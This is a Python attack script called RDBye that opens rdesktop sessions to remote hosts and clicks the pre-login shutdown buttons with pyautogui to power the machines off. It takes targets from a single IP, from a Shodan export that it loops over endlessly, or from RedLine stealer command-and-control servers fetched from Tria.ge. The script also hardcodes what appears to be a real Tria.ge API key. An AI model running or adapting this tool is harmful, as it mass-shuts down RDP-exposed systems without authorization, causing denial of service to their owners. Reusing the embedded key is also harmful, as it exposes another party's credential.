import subprocess
from subprocess import check_output
import pyautogui
import os
import signal
import json
import time
import sys
import psutil
import random
from pyfiglet import Figlet
import argparse
import string
import requests



triage_api_key = "e7caa815f0a1c2730141f1413210af183ab19622"

def generate_random_user(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str
    

def print_header():
    possible_fonts = ['banner','big', 'digital', 'shadow']
    f = Figlet(font=possible_fonts[random.randint(0, len(possible_fonts) - 1)])
    print(f.renderText("RDBye"))


def attack(ip):
    rdesktop_output = ""
    server_detected = False

    # For Windows Client systems (7,10,11)
    shutdown_button = [985,791]
    shutdown = [992,709]
    continue_button = [970,726]
    continue_anyway = [970,726]

    p  = subprocess.Popen(["echo 'yes' | rdesktop -u " + generate_random_user(random.randint(8,16)) + " -n " + generate_random_user(random.randint(8,16)) + " " + ip], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print("Spawned rdesktop with PID " + str(p.pid) + " to interact with " + ip)       
    print("Waiting for RDesktop window to load")
    # time.sleep(4)
    
    rdesktop_spawned = False
    max_wait_time = 4
    waited = 0
    while waited < max_wait_time:
        out = check_output(["wmctrl -l|awk '{$3=\"\"; $2=\"\"; $1=\"\"; print $0}'"], shell=True)
        if "rdesktop - " in out.decode("utf-8"):
            print("Found RDesktop window")
            rdesktop_spawned = True
            break
        else:
            time.sleep(0.1)
            waited += 0.1
            
    if rdesktop_spawned:
        # Wait for window to fully load
        time.sleep(2)
    else:
        print("Giving up since no rdesktop window spawned.\n")
        return    
    
    # We are getting the color of the RDP window to distinguish between server and client systems since the positions
    # of the buttons slightly differ
    print("Checking for OS type...")
    px = pyautogui.pixel(70,100)

    if str(px) == "RGB(red=8, green=24, blue=66)":
        print("Detected Windows Server OS")
        server_detected = True
        shutdown_button = [966,772]
        shutdown = [981,681]
        continue_button = [962,708]
        continue_anyway = [962,708]
    else:
        print("Detected non-server OS (or no RDP window at all)")

    # Click on shutdown button
    pyautogui.moveTo(shutdown_button[0], shutdown_button[1], duration = 1)
    pyautogui.click(button='left')

    # Click on "shutdown"
    pyautogui.moveTo(shutdown[0], shutdown[1], duration = 1)
    pyautogui.click(button='left')

    # Click on "Continue"
    pyautogui.moveTo(continue_button[0], continue_button[1], duration = 1)
    pyautogui.click(button='left')

    # Click on "Shutdown anyway"
    pyautogui.moveTo(continue_anyway[0], continue_anyway[1], duration = 1)
    pyautogui.click(button='left')
    print("RDP shutdown initiated!")
    time.sleep(1)
    
    print("Killing rdesktop session with PID  " + str(p.pid))
    try:
        processes = filter(lambda p: psutil.Process(p).name() == "rdesktop", psutil.pids())
        for pid in processes:
            os.kill(pid, signal.SIGKILL)
    except:
        pass
    print("\n")


print_header()
parser = argparse.ArgumentParser(
                    prog='RDBye',
                    description='Script to exploit RDP to shut down remote hosts',
                    epilog='Button positions are based upon resolution of 1690x920, if your screen resolution differs you might need to adjust those values!')

parser.add_argument('-s', '--shodan', help='JSON file exported from shodan.io')     
parser.add_argument('-i', '--ip_address', help='Single IP address as target')  
parser.add_argument('-r', '--redline', help='Downloaddd Redline Command & Control servers from Tria.ge (API key required)', action='store_true')

args = parser.parse_args()
if args.shodan:
    # To get pixel colors to distinguish between server and client systems
    # sudo apt-get install scrot
    ip_addresses = []
    with open(args.shodan, "r") as input_file:
        content = input_file.read()
        lines = content.split("\n")
        for line in lines:
            try:
                line_json = json.loads(line)
                ip_addresses.append(line_json['ip_str'])
            except Exception as ex:
                print("Couldn't load json line (" + str(ex) + ")")
    print("Found " + str(len(ip_addresses)) + " IP addresses")

    # Reordering IPs so we do not always hit the same IPs
    while True:
        print("Shuffeling IP addresses")
        random.shuffle(ip_addresses)

        for ip in ip_addresses:
            attack(ip)  
             
elif args.ip_address:
    attack(args.ip_address)
    
elif args.redline:
    if triage_api_key == "":
        print("Please add your Tria.ge API key to the script...")
        exit()
    print("Gathering targets from Tria.ge...")
    data = {"family": "redline", "limit": 200}
    headers = {"Authorization": "Bearer " + triage_api_key}

    result = requests.get("https://tria.ge/api/v0/search?query=family:redline&limit=200", data=data, headers=headers).json()

    C2s = []    

    for s in result['data']:
        try:
            overview = requests.get("https://tria.ge/api/v0/samples/" + s['id'] + "/overview.json", data=data, headers=headers).json()
            
            for extracted in overview['extracted']:
                if extracted['config']['family'] == "redline":   
                    print("Botnet: " + extracted['config']['botnet'])
                    print("C2: " + extracted['config']['c2'][0])
                    C2s.append(extracted['config']['c2'][0])
        except Exception as e:
            print("Error while downloading result: " + str(e))
            pass
            
    # Deduplicate
    C2s = set(C2s)
    
    print("Extracted " + str(len(C2s)) + " from Tria.ge!")
    
    for c2 in C2s:
        server = c2.split(":")[0]        
        attack(server)

else:
    parser.print_help()    



